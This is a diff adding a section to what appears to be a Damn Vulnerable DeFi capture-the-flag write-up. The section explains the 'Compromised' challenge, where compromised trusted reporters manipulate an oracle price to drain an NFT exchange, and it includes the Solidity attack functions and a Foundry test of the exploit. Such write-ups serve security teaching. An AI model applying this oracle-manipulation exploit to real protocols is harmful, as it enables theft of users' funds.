@@ -134,3 +134,47 @@ To exploit this vulnerability, we utilize the flash loan feature provided by the
         return CALLBACK_SUCCESS;
     }
 ```
+## 7. Compromised
+The vulnerability exploited in this attack lies in the `TrustfulOracle` contract's reliance on a fixed set of trusted reporters to determine the price of the DVNFT tokens. By compromising trusted reporters, the attacker can manipulate the reported price, leading to erroneous valuations within the `Exchange` contract.
+```solidity
+ function postPrice(string calldata symbol, uint256 newPrice) external onlyRole(TRUSTED_SOURCE_ROLE) {
+        _setPrice(msg.sender, symbol, newPrice);
+    }
+```
+### Solution
+To execute the attack, the attacker first manipulates the `TrustfulOracle` by feeding it false price information using the compromised reporters. This lowers the price of DVNFT tokens on the `Exchange` contract, allowing the attacker to purchase them at a significantly reduced rate(`function attack1()`). Once the tokens are acquired, the attacker quickly reverts the price manipulation, restoring the DVNFT token price to its original value. The attacker then sells the purchased tokens back to the `Exchange` contract at the higher price(`function attack2()`), effectively profiting from the price discrepancy.
+
+```solidity
+ function attack1()external{
+        id = exchange.buyOne{value: address(this).balance}();
+        token.approve(address(exchange), id);
+    }
+
+    function attack2()external{
+        exchange.sellOne(id);
+    }
+```
+In the `TestAttack` contract, the manipulation of the DVNFT token price is demonstrated using Foundry. Initially, the attacker pranks the `TrustfulOracle` by posting false price information, setting the DVNFT token price to 0. After that, the attacker executes the first stage of the attack by purchasing DVNFT tokens from the `Exchange` contract at the artificially lowered price. We reverse the price manipulation, restoring the DVNFT token price to its original value. After that, the attacker completes the attack by selling the acquired tokens back to the `Exchange` contract at the higher price.
+```solidity
+ function testAttack()external{
+        for(uint256 i; i<3; i++){
+            vm.prank(sources[i]);
+            oracle.postPrice("DVNFT", 0);
+        }
+        assertEq(oracle.getMedianPrice("DVNFT"), 0);
+
+        attacker.attack1();
+
+        for(uint256 i; i<3; i++){
+            vm.prank(sources[i]);
+            oracle.postPrice("DVNFT", INITIAL_EXCHANGE_ETH_BALANCE);
+        }
+        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_EXCHANGE_ETH_BALANCE);
+
+        attacker.attack2();
+
+        assertEq(address(exchange).balance, 0);
+        assertEq(exchange.token().balanceOf(address(attacker)), 0);
+        assertEq(address(attacker).balance, INITIAL_EXCHANGE_ETH_BALANCE + INITIAL_PLAYER_ETH_BALANCE);
+    }
+```
